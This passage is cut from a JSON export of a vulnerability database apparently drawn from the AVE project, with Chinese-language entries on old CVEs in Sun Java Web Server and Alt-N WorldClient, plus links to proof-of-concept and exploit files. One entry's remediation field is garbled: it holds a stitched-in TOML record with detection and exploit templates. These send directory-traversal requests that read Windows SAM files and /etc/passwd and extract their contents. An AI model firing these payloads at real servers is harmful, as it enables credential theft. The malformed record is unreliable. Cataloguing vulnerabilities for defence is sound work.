CVE-2000-0642.json","https://github.com/github/advisory-database/blob/c55392b715d0e2e1caa8bc26997a940be7494a13/advisories/unreviewed/2022/04/GHSA-52p2-82rj-4r39/GHSA-52p2-82rj-4r39.json","https://github.com/blackhook/nessus-plugins/blob/64177d96abbb07c58cf7e131046b067ebc61fcb5/W/webactive_log.nasl","https://github.com/intSpLoiT/intframework/blob/eabaa799d0260aa52b735fa9769266d1ce4b64ef/modules/cve_list.txt","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0642.json","https://github.com/oasis-open/cti-stix-common-objects/blob/55ba7598cbd5a52577b6887871505d931d85cb61/objects/vulnerability/vulnerability--e6fa196a-cab4-4aa3-8633-113293ffee80.json","https://github.com/Freem93/grammar_nasl_v2/blob/63834ebb8cd6e97050e155291c7500ad53bb20c6/plugins/webactive_log.nasl"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2000/POC-AVE-2000-0780.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2000/EXP-AVE-2000-0780.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0780.toml"},{"ave_id":"AVE-2000-0763","file_name":"2000/AVE-2000-0763.toml","cve_id":"CVE-2000-0629","title":"Sun Java System Web Server 代码执行漏洞","description":"该漏洞源于 Sun Java web 服务器 2.0 及其早期版本的默认配置问题。攻击者可通过 board.html 文件上传恶意 Java 代码，然后直接调用 JSP 编译器servlet，在绕过常规验证的情况下直接编译执行恶意代码。由于该服务器没有对上传和编译过程进行充分的验证和权限控制，攻击者得以轻易达到远程代码执行的目的，完全控制受影响的系统，导致服务器上的数据被盗用、篡改、删除等情况；同时攻击者可以借此手段进行进一步的 lateral movement等操作，危害系统的整体安全状态。该漏洞影响范围包括所有安装了 Sun Java web 服务器 2.0 及更早版本的用户，攻击者无需任何权限即可发起攻击，技术实现门槛较低。利用方法是首先通过 board.html 文件上传恶意 Java 源文件（通常包含后门代码），然后直接访问JSP编译器servlet以触发编译和执行过程，实现远程代码执行。 Sun 公司已发布安全补丁，修复了对上传文件和调用编译功能的访问控制，建议用户尽快更新补丁或卸载旧版本服务器。 该漏洞评分方法是按照 CVSS v2 标准进行评估，其中攻击向量为网络（AV:N）得分 3 分，攻击复杂性为低（AC:L）得分 1.5 分，权限数量为无（Au:N）得分 1.5 分，同时由于该漏洞会对系统 的机密性机密性（C）方面造成部分影响 2 分，完整性（I）方面造成部分影响 2 分，可用性（A）方面造成部分影响 2 分，因此该漏洞的最终评分为 7.5 分。公共暴露率为 10 %。","severity":"HIGH","score":7.5,"aliases":["CVE-2000-0629"],"sources":["avd"],"published":"2000-07-12T04:00:00Z","updated":"2026-06-16T21:52:08Z","remediation":"立即应用 Sun 安全公告 jwsca-2000-02 提供的补丁，将 Sun Java Web Server 升级至修复版本或更高版本（如 Sun Java System Web Server 6.1 及以上）。如无法立即升级，应禁用或删除 board.html 文件以阻断攻击入口，并在 web server 配置中限制 JSP 编译器 servlet 仅对受信任用户开放，同时在防火墙层面限制对 web 服务器端口的外部访问作为临时缓解措施。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://archives.neohapsis.com/archives/bugtraq/2000-07/0163.html","http://www.securityfocus.com/bid/1459","http://www.sun.com/software/jwebserver/faq/jwsca-2000-02.html","https://github.com/CVEProject/cvelistV5/blob/7102a069678e6b88d270e4c0da51e40aee59b148/cves/2000/0xxx/CVE-2000-0629.json","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2000/CVE-2000-0629","https://github.com/HORKimhab/poc-cve-collection/blob/56ecbe5708e7172ccdeffde501e0321bbd31bea6/2000/0xxx/CVE-2000-0629.md","https://github.com/Patrowl/PatrowlHearsData/blob/86ec648b067e7f3c439a59ccb9e6e448f07cc2d1/CVE/data/2000/CVE-2000-0629.json","https://github.com/github/advisory-database/blob/bf2e2ab4687e3840d3ae537224ca3dbe9e3c1067/advisories/unreviewed/2022/04/GHSA-3987-59ph-j5q3/GHSA-3987-59ph-j5q3.json","https://github.com/yarencheng/cve-devops-playground/blob/c54e59752dddfc9aa36c13774164384cfa0d1f04/content/CVE-2000-0629.md","https://github.com/Freem93/grammar_nasl_v2/blob/63834ebb8cd6e97050e155291c7500ad53bb20c6/plugins/bboard.nasl","https://github.com/intSpLoiT/intframework/blob/eabaa799d0260aa52b735fa9769266d1ce4b64ef/modules/cve_list.txt","https://github.com/nomi-sec/NVD-Database/blob/23dc120c34402aaa65883c51c1d03b3cb02c20cb/2000/CVE-2000-0629.json","https://github.com/KTZgraph/sarenka/blob/f1fb931ab722d6c096d581ed6e3c5966d799fbaa/sarenka/feeds/cve_details/cve_all_details_152600_152700.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2000/POC-AVE-2000-0763.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2000/EXP-AVE-2000-0763.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2000/AVE-2000-0763.toml"},{"ave_id":"AVE-2000-0513","file_name":"2000/AVE-2000-0513.toml","cve_id":"CVE-2000-0660","title":"alt-n WorldClient 2.1 目录遍历漏洞","description":"alt-n WorldClient 2.1 的 WDaemon Web 服务器存在目录遍历漏洞。远程攻击者无需身份认证即可通过向目标服务器发送包含 `..`（点点）序列的特制 HTTP 请求，绕过路径限制读取服务器上的任意文件。该漏洞可导致敏感信息泄露（如配置文件、系统文件等），影响运行 WorldClient 2.1 的邮件服务器。攻击条件简单，仅需目标开放 Web 服务端口即可利用。","severity":"MEDIUM","score":5.0,"aliases":["CVE-2000-0660"],"sources":["avd"],"published":"2000-07-12T04:00:00Z","updated":"2026-06-16T21:52:12Z","remediation":"[id]\nave_id = \"AVE-2000-00001\"\naliases = [\"CVE-2000-0660\", \"GHSA-r4c5-4hcj-q3cc\"]\n\n[basic]\ntitle = \"Alt-N WorldClient 2.1 WDaemon Web服务器目录遍历漏洞\"\ndescription = \"Alt-N WorldClient 2.1 的 WDaemon Web 服务器组件存在目录遍历漏洞。远程攻击者无需认证即可通过向服务器发送包含 ..（点号点号）或 ..\\ 序列的特制 HTTP 请求，绕过路径限制读取服务器上任意已知位置的文件，如系统敏感文件 sam._。该漏洞源于服务器未对用户请求中的路径进行充分过滤和规范化处理。\"\nseverity = \"MEDIUM\"\nscore = 5.0\nsources = [\"cve\", \"exploitdb\"]\npublished = \"2000-07-12\"\nupdated = \"2024-06-16\"\nremediation = \"升级到 WorldClient 2.1 之后的最新版本，或迁移至 Alt-N 后续产品 MDaemon 的受支持版本。由于该产品已停止维护，建议更换为仍在安全更新周期内的邮件服务器软件。\"\n\n[references]\nurls = [\"http://archives.neohapsis.com/archives/bugtraq/2000-07/0173.html\", \"http://www.securityfocus.com/bid/1462\", \"https://exchange.xforce.ibmcloud.com/vulnerabilities/4913\", \"https://www.exploit-db.com/exploits/20070\", \"http://www.osvdb.org/1459\"]\n\n[exploit]\npoc_urls = [\"https://www.exploit-db.com/exploits/20070\"]\nexp_urls = [\"https://www.exploit-db.com/exploits/20070\"]\n\n[meta]\nstatus = \"completed\"\ncollected_at = \"2026-07-28T00:00:00Z\"\n\n[info]\nid = \"POC-AVE-2000-00001\"\nname = \"CVE-2000-0660 PoC\"\nauthor = \"AVE\"\nseverity = \"medium\"\ntags = [\"cve-2000-0660\", \"directory-traversal\", \"worldclient\"]\ndescription = \"检测 Alt-N WorldClient 2.1 WDaemon 服务器是否存在目录遍历漏洞，通过发送包含 ..\\ 序列的 HTTP 请求尝试读取系统文件\"\nvuln_id = [\"CVE-2000-0660\", \"AVE-2000-00001\"]\n\n[poc]\nlogic = \"any\"\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/..\\\\..\\\\..\\\\winnt\\\\repair\\\\sam._\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"word\"\nwords = [\"SAM\", \"boot key\", \"Administrator\"]\nexpect = true\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/..\\\\..\\\\..\\\\..\\\\etc\\\\passwd\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"word\"\nwords = [\"root:\", \"nobody:\"]\nexpect = true\n\n[info]\nid = \"EXP-AVE-2000-00001\"\nname = \"CVE-2000-0660 EXP\"\nauthor = \"AVE\"\nseverity = \"medium\"\ntags = [\"cve-2000-0660\", \"directory-traversal\", \"worldclient\"]\ndescription = \"利用 Alt-N WorldClient 2.1 WDaemon 目录遍历漏洞读取远程服务器任意文件\"\nvuln_id = [\"CVE-2000-0660\", \"AVE-2000-00001\"]\n\n[poc]\nlogic = \"any\"\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/..\\\\..\\\\..\\\\winnt\\\\repair\\\\sam._\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"word\"\nwords = [\"SAM\", \"boot key\", \"Administrator\"]\nexpect = true\n\n[[poc.requests.extractors]]\ntype = \"regex\"\npart = \"body\"\nname = \"sam_content\"\nregex = [\"(.+)\"]\ngroup = 1\n\n[[poc.requests]]\nprotocol = \"http\"\nmethod = \"GET\"\npath = \"/{{BaseURL}}/..\\\\..\\\\..\\\\..\\\\winnt\\\\system32\\\\config\\\\sam\"\nheaders = { \"User-Agent\" = \"AVE/1.0\" }\n\n[[poc.requests.matchers]]\ntype = \"status\"\nstatus = [200]\nexpect = true\n\n[[poc.requests.extractors]]\ntype = \"regex\"\npart = \"body\"\nname = \"sam_binary\"\nregex = [\"(.+)\"]\ngroup = 1\n","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://archives.neohapsis.com/archives/bugtraq/2000-07/0173.html","http://www.altn.com/Downloads/WorldClient/Release/RelNotes.txt","http://www.osvdb.org/1459","h